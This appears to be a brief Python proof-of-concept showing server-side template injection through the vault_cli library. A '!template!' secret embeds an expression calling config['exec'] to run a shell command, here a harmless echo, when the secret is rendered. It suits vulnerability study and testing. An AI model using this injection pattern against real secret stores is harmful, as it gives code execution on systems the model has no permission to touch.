import vault_cli

malicious_secret = "!template! {{ config['exec']('echo Malicious Code Executed') }}"

def simulate_attack():
    client = vault_cli.get_client()

    rendered_secret = client.get_secret(malicious_secret)

    print(rendered_secret)

simulate_attack()